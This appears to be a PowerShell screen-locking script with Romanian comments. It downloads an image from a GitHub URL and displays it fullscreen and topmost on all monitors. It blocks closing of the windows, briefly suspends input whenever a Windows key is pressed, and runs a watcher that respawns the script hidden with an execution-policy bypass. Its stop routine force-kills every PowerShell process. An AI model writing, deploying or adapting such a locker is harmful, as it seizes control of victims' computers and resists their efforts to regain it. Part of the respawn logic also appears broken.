# URL-ul imaginii
$imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
$tempImagePath = "$env:TEMP\image.jpg"

# Funcție pentru descărcarea imaginii
function Download-Image {
    try {
        Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -ErrorAction Stop
    } catch {
        Write-Host "Eroare la descărcarea imaginii. Verificați conexiunea la internet." -ForegroundColor Red
        exit
    }
}

# Funcție pentru blocarea tastei Windows
function Block-WindowsKey {
    Add-Type @"
        using System;
        using System.Runtime.InteropServices;
        public class InterceptKeys {
            [DllImport("user32.dll")]
            public static extern int GetAsyncKeyState(int vKey);
            [DllImport("user32.dll")]
            public static extern int BlockInput(bool block);
        }
"@
    Start-Job -ScriptBlock {
        while ($true) {
            Start-Sleep -Milliseconds 100
            if ([InterceptKeys]::GetAsyncKeyState(0x5B) -ne 0) { # Tasta Windows stânga
                [InterceptKeys]::BlockInput($true)
                Start-Sleep -Milliseconds 100
                [InterceptKeys]::BlockInput($false)
            }
            if ([InterceptKeys]::GetAsyncKeyState(0x5C) -ne 0) { # Tasta Windows dreapta
                [InterceptKeys]::BlockInput($true)
                Start-Sleep -Milliseconds 100
                [InterceptKeys]::BlockInput($false)
            }
        }
    } | Out-Null
}

# Afișare imagine pe toate monitoarele
function Show-FullScreenImage {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    $screens = [System.Windows.Forms.Screen]::AllScreens
    $forms = @()

    foreach ($screen in $screens) {
        $form = New-Object System.Windows.Forms.Form
        $form.WindowState = 'Maximized'
        $form.FormBorderStyle = 'None'
        $form.TopMost = $true
        $form.StartPosition = 'Manual'
        $form.Location = $screen.Bounds.Location
        $form.Size = $screen.Bounds.Size

        try {
            $img = [System.Drawing.Image]::FromFile($tempImagePath)
        } catch {
            Write-Host "Eroare la încărcarea imaginii. Verificați fișierul descărcat." -ForegroundColor Red
            exit
        }

        $pictureBox = New-Object System.Windows.Forms.PictureBox
        $pictureBox.Image = $img
        $pictureBox.Dock = 'Fill'
        $pictureBox.SizeMode = 'StretchImage'
        $form.Controls.Add($pictureBox)

        # Protejează împotriva închiderii accidentale
        $form.Add_FormClosing({
            param($sender, $eventArgs)
            if (-not $global:exitFlag) {
                $eventArgs.Cancel = $true
            }
        })

        $forms += $form
    }

    # Rulează formularele pe toate monitoarele
    foreach ($form in $forms) {
        [void]$form.Show()
    }

    [System.Windows.Forms.Application]::Run()
}

# Funcție de monitorizare pentru repornire automată
function Monitor-Image {
    $scriptPath = $MyInvocation.MyCommand.Definition

    while ($true) {
        $processes = Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object { $_.Path -like "*$scriptPath*" }
        if (-not $processes) {
            Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath`"" -WindowStyle Hidden
        }
        Start-Sleep -Seconds 2
    }
}

# Funcție pentru oprirea completă a aplicației (folosind `cdr`)
function Stop-All {
    $global:exitFlag = $true
    Stop-Process -Name "powershell" -Force -ErrorAction SilentlyContinue
    exit
}

# Pornire aplicație
Download-Image
Block-WindowsKey
Start-Job -ScriptBlock { Monitor-Image }
Show-FullScreenImage
